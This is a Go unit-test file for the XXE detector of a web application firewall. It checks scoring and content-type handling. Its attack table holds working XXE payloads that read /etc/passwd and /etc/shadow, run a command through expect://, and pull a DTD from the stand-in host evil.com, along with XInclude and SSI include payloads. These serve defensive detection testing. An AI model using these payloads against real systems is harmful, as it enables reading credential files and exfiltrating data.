package xxe

import (
	"testing"

	"github.com/ersinkoc/guardianwaf/internal/engine"
)

// Attack payloads with XML content types
var attackPayloads = []struct {
	name     string
	input    string
	minScore int
}{
	{"basic xxe file", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, 50},
	{"xxe http", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/data">]><foo>&xxe;</foo>`, 50},
	{"xxe expect", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`, 50},
	{"xxe php filter", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>`, 50},
	{"parameter entity", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>`, 50},
	{"xinclude", `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`, 70},
	{"ssi include", `<!--#include virtual="/etc/passwd" -->`, 65},
	{"entity only", `<!ENTITY test SYSTEM "file:///etc/shadow">`, 50},
	{"doctype with entity", `<!DOCTYPE foo [<!ENTITY bar "test">]>`, 50},
	{"cdata suspicious", `<data><![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]></data>`, 40},
}

// Benign XML inputs
var benignInputs = []struct {
	name     string
	input    string
	maxScore int
}{
	{"simple xml", `<?xml version="1.0"?><root><item>test</item></root>`, 0},
	{"xml with attributes", `<user name="John" age="30"/>`, 0},
	{"soap envelope", `<soap:Envelope><soap:Body><GetPrice><Item>Apples</Item></GetPrice></soap:Body></soap:Envelope>`, 0},
	{"rss feed", `<rss version="2.0"><channel><title>News</title></channel></rss>`, 0},
	{"empty xml", `<root/>`, 0},
}

func TestDetect_AttackPayloads(t *testing.T) {
	for _, tt := range attackPayloads {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "body")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < minimum %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_BenignInputs(t *testing.T) {
	for _, tt := range benignInputs {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "body")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore > tt.maxScore {
				t.Errorf("input=%q: total score %d > maximum %d\nfindings: %+v",
					tt.input, totalScore, tt.maxScore, findings)
			}
		})
	}
}

func TestDetect_EmptyInput(t *testing.T) {
	findings := Detect("", "body")
	if findings != nil {
		t.Errorf("expected nil findings for empty input, got %v", findings)
	}
}

func TestDetect_FindingFields(t *testing.T) {
	findings := Detect(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, "body")
	if len(findings) == 0 {
		t.Fatal("expected at least one finding")
	}

	for _, f := range findings {
		if f.DetectorName != "xxe" {
			t.Errorf("DetectorName: expected 'xxe', got %q", f.DetectorName)
		}
		if f.Category != "xxe" {
			t.Errorf("Category: expected 'xxe', got %q", f.Category)
		}
		if f.Location != "body" {
			t.Errorf("Location: expected 'body', got %q", f.Location)
		}
		if f.Score <= 0 {
			t.Errorf("Score should be > 0, got %d", f.Score)
		}
		if f.Description == "" {
			t.Error("Description should not be empty")
		}
	}
}

func TestDetector_Integration(t *testing.T) {
	det := NewDetector(true, 1.0)

	var _ engine.Detector = det

	if det.Name() != "xxe-detector" {
		t.Errorf("expected name 'xxe-detector', got %q", det.Name())
	}
	if det.DetectorName() != "xxe" {
		t.Errorf("expected detector name 'xxe', got %q", det.DetectorName())
	}
	if len(det.Patterns()) == 0 {
		t.Error("expected non-empty patterns list")
	}

	// Test with XML content type
	ctx := &engine.RequestContext{
		ContentType:    "application/xml",
		NormalizedBody: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionLog {
		t.Errorf("expected ActionLog, got %v", result.Action)
	}
	if result.Score < 50 {
		t.Errorf("expected score >= 50, got %d", result.Score)
	}
	if len(result.Findings) == 0 {
		t.Error("expected findings for XXE payload")
	}
}

func TestDetector_NonXMLContentType(t *testing.T) {
	det := NewDetector(true, 1.0)

	// Non-XML content type should be skipped
	ctx := &engine.RequestContext{
		ContentType:    "application/json",
		NormalizedBody: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("non-XML content type should return ActionPass, got %v", result.Action)
	}
	if len(result.Findings) != 0 {
		t.Errorf("non-XML content type should produce no findings, got %d", len(result.Findings))
	}
}

func TestDetector_XMLContentTypes(t *testing.T) {
	det := NewDetector(true, 1.0)
	payload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`

	contentTypes := []string{
		"application/xml",
		"text/xml",
		"application/soap+xml",
		"application/rss+xml",
		"application/xhtml+xml",
	}

	for _, ct := range contentTypes {
		t.Run(ct, func(t *testing.T) {
			ctx := &engine.RequestContext{
				ContentType:    ct,
				NormalizedBody: payload,
				NormalizedQuery: map[string][]string{},
				Headers:         map[string][]string{},
				Cookies:         map[string]string{},
			}
			result := det.Process(ctx)
			if result.Score < 50 {
				t.Errorf("content-type %q: expected score >= 50, got %d", ct, result.Score)
			}
		})
	}
}

func TestDetector_Disabled(t *testing.T) {
	det := NewDetector(false, 1.0)

	ctx := &engine.RequestContext{
		ContentType:    "application/xml",
		NormalizedBody: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("disabled detector should return ActionPass, got %v", result.Action)
	}
}

func TestDetector_Multiplier(t *testing.T) {
	payload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`

	det1 := NewDetector(true, 1.0)
	ctx1 := &engine.RequestContext{
		ContentType:    "text/xml",
		NormalizedBody: payload,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result1 := det1.Process(ctx1)

	det2 := NewDetector(true, 2.0)
	ctx2 := &engine.RequestContext{
		ContentType:    "text/xml",
		NormalizedBody: payload,
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result2 := det2.Process(ctx2)

	if result1.Score == 0 {
		t.Fatal("baseline score should not be 0")
	}
	if result2.Score < result1.Score {
		t.Errorf("2x multiplier score %d should be >= 1x score %d", result2.Score, result1.Score)
	}
}

func TestIsXMLContentType(t *testing.T) {
	xmlTypes := []string{
		"application/xml", "text/xml", "application/soap+xml",
		"application/rss+xml", "application/xhtml+xml",
	}
	for _, ct := range xmlTypes {
		if !isXMLContentType(ct) {
			t.Errorf("expected %q to be XML content type", ct)
		}
	}

	nonXMLTypes := []string{
		"application/json", "text/html", "text/plain",
		"multipart/form-data", "application/octet-stream",
	}
	for _, ct := range nonXMLTypes {
		if isXMLContentType(ct) {
			t.Errorf("expected %q to NOT be XML content type", ct)
		}
	}
}

func BenchmarkDetect(b *testing.B) {
	input := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Detect(input, "body")
	}
}
